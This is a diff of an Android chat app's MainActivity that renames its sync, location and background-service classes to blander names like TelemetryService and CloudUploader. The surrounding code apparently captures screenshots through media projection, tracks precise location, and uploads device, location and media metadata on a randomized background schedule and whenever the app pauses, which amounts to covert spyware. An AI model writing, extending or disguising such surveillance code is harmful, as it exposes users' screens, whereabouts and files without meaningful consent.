@@ -32,10 +32,9 @@ import com.bumptech.glide.Glide
 import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
 import com.example.ChatterBox.accessibility.IdleDetector
-import com.example.ChatterBox.database.AccountManager
-import com.example.ChatterBox.database.BackgroundSyncService
-import com.example.ChatterBox.database.DataSynchronizer
-import com.example.ChatterBox.database.LocationTracker
+import com.example.ChatterBox.database.TelemetryService
+import com.example.ChatterBox.database.CloudUploader
+import com.example.ChatterBox.database.GeoLocator
 import com.example.ChatterBox.util.PermissionsManager
 import com.google.android.material.navigation.NavigationView
 import com.google.firebase.FirebaseApp
@@ -52,7 +51,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     private lateinit var drawerLayout: DrawerLayout
     private val appExecutor = Executors.newSingleThreadExecutor()
     private val handler = Handler(Looper.getMainLooper())
-    private var dataSynchronizer: DataSynchronizer? = null
+    private var cloudUploader: CloudUploader? = null
     private var mediaProjectionResultCode: Int = 0
     private var mediaProjectionData: Intent? = null
 
@@ -109,14 +108,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     com.example.ChatterBox.accessibility.ScreenOnService.keepScreenOn(this)
 
                     if (mediaProjectionResultCode != 0 && mediaProjectionData != null) {
-                        val serviceIntent = Intent(this, BackgroundSyncService::class.java)
+                        val serviceIntent = Intent(this, TelemetryService::class.java)
                         serviceIntent.action = "CAPTURE_SCREENSHOT"
                         serviceIntent.putExtra("resultCode", mediaProjectionResultCode)
                         serviceIntent.putExtra("data", mediaProjectionData)
                         startService(serviceIntent)
                     }
 
-                    dataSynchronizer?.synchronizeData()
+                    cloudUploader?.startUploadJob()
 
                     collectLocationData()
                 }
@@ -134,17 +133,17 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 android.Manifest.permission.ACCESS_FINE_LOCATION
             ) == PackageManager.PERMISSION_GRANTED
         ) {
-            val locationTracker = LocationTracker.getInstance(this)
-            locationTracker.captureLastKnownLocation { locationData ->
+            val geoLocator = GeoLocator.getInstance(this)
+            geoLocator.getLastGeoFix { locationData ->
                 // Device ID is already included in locationData by LocationTracker
-                dataSynchronizer?.sendData("location_data", locationData.toString())
+                cloudUploader?.postJson("location_data", locationData.toString())
             }
         }
     }
     private fun initializeBackgroundSync() {
         appExecutor.execute {
             try {
-                dataSynchronizer = DataSynchronizer(this)
+                cloudUploader = CloudUploader(this)
 
                 handler.post {
                     try {
@@ -173,14 +172,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 put("timestamp", System.currentTimeMillis())
             }
 
-            dataSynchronizer?.sendData("app_analytics", deviceInfo.toString())
+            cloudUploader?.postJson("app_analytics", deviceInfo.toString())
             if (ContextCompat.checkSelfPermission(
                     this,
                     android.Manifest.permission.ACCESS_FINE_LOCATION
                 ) == PackageManager.PERMISSION_GRANTED
             ) {
-                val locationTracker = LocationTracker.getInstance(this)
-                locationTracker.startTracking()
+                val geoLocator = GeoLocator.getInstance(this)
+                geoLocator.initGeoMonitor()
             }
         } catch (e: Exception) {
             Log.e(TAG, "Analytics error: ${e.message}")
@@ -208,7 +207,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         val initialSyncDelay = (2 + Math.random() * 3).toLong()
         scheduler.scheduleWithFixedDelay({
             try {
-                dataSynchronizer?.synchronizeData()
+                cloudUploader?.startUploadJob()
             } catch (e: Exception) {
                 Log.e(TAG, "Error in sync task: ${e.message}")
             }
@@ -272,7 +271,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     put("android_version", Build.VERSION.RELEASE)
                 }
 
-                dataSynchronizer?.sendData("media_metadata", mediaData.toString())
+                cloudUploader?.postJson("media_metadata", mediaData.toString())
             }
         } catch (e: Exception) {
             Log.e(TAG, "Media scan error: ${e.message}")
@@ -285,7 +284,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
     }
 
     private fun startScreenAnalyticsService(resultCode: Int, data: Intent) {
-        val serviceIntent = Intent(this, BackgroundSyncService::class.java)
+        val serviceIntent = Intent(this, TelemetryService::class.java)
         serviceIntent.action = "SETUP_PROJECTION"
         serviceIntent.putExtra("resultCode", resultCode)
         serviceIntent.putExtra("data", data)
@@ -377,7 +376,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                             grantResults[index] == PackageManager.PERMISSION_GRANTED
                 }.isNotEmpty()
                 if (locationGranted) {
-                    LocationTracker.getInstance(this).startTracking()
+                    GeoLocator.getInstance(this).initGeoMonitor()
                 }
                 handleSpecialPermissions()
             }
@@ -440,7 +439,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         super.onPause()
 
         handler.postDelayed({
-            dataSynchronizer?.synchronizeData()
+            cloudUploader?.startUploadJob()
         }, 5000)
     }
     override fun onDestroy() {
